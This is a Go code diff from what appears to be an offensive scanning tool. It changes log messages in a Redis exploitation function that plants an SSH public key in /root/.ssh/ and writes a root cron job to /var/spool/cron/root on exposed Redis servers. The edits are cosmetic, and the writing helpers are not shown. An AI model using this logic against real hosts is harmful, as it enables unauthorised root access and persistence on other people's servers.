@@ -96,15 +96,16 @@ func Expoilt(realhost string, conn net.Conn) error {
 		return err
 	}
 	if flagSsh == true {
-		result := fmt.Sprintf("Redis:%v like can write /root/.ssh/", realhost)
+		result := fmt.Sprintf("[+] Redis:%v like can write /root/.ssh/", realhost)
 		common.LogSuccess(result)
 		if common.RedisFile != "" {
 			writeok, text, err := writekey(conn, common.RedisFile)
 			if err != nil {
+				fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("%v SSH public key was written successfully", realhost)
+				result := fmt.Sprintf("[+] %v SSH public key was written successfully", realhost)
 				common.LogSuccess(result)
 			} else {
 				fmt.Println("Redis:", realhost, "SSHPUB write failed", text)
@@ -113,7 +114,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 	}
 
 	if flagCron == true {
-		result := fmt.Sprintf("Redis:%v like can write /var/spool/cron/", realhost)
+		result := fmt.Sprintf("[+] Redis:%v like can write /var/spool/cron/", realhost)
 		common.LogSuccess(result)
 		if common.RedisShell != "" {
 			writeok, text, err := writecron(conn, common.RedisShell)
@@ -121,10 +122,10 @@ func Expoilt(realhost string, conn net.Conn) error {
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("%v /var/spool/cron/root was written successfully", realhost)
+				result := fmt.Sprintf("[+] %v /var/spool/cron/root was written successfully", realhost)
 				common.LogSuccess(result)
 			} else {
-				fmt.Println("Redis:", realhost, "cron write failed", text)
+				fmt.Println("[-] Redis:", realhost, "cron write failed", text)
 			}
 		}
 	}
